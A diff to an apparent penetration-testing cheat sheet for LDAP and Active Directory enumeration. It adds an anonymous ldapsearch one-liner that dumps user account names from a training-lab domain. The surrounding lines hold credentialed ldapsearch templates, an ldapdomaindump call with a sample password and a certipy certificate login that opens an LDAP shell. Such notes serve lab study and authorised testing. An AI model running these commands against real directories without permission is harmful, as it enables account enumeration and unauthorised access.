@@ -17,6 +17,10 @@ ldapsearch -x -H ldap://<IP>:<port>
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+# Anonymously grab users
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+
 #CN name describes the info w're collecting
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -57,6 +61,6 @@ sudo ldapdomaindump ldaps://10.13.37.10 -u 'MARVEL\fcastle' -p Password1
 firefox domain_users_by_group.html
 ```
 
-```
+```bash
 certipy auth -pfx baker.pfx -dc-ip 10.129.234.143 -ldap-shell
 ```
